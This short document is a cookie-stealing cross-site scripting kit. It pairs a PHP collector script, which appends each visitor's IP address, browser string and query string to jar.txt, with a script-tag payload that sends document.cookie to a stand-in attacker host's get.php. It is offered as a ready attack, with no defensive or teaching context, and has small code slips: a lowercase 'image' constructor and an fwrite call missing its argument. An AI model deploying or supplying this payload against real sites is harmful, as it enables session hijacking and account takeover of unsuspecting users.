##########################################################################################################

get.php file on web server to write to jar.txt

##########################################################################################################

<?php

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$fp = fopen('jar.txt', 'a');

fwrite($fp, $ip.' '.$browser." \n");
fwrite($fp, urldecode($_SERVER['QUERY_STRING']). " \n\n");
fwrite($fp);
?>

##########################################################################################################

php string to send to above php file

##########################################################################################################

<script> var i = new image(); i.src="http://attacker.site/get.php?cookie="+escape(document.cookie)</script>
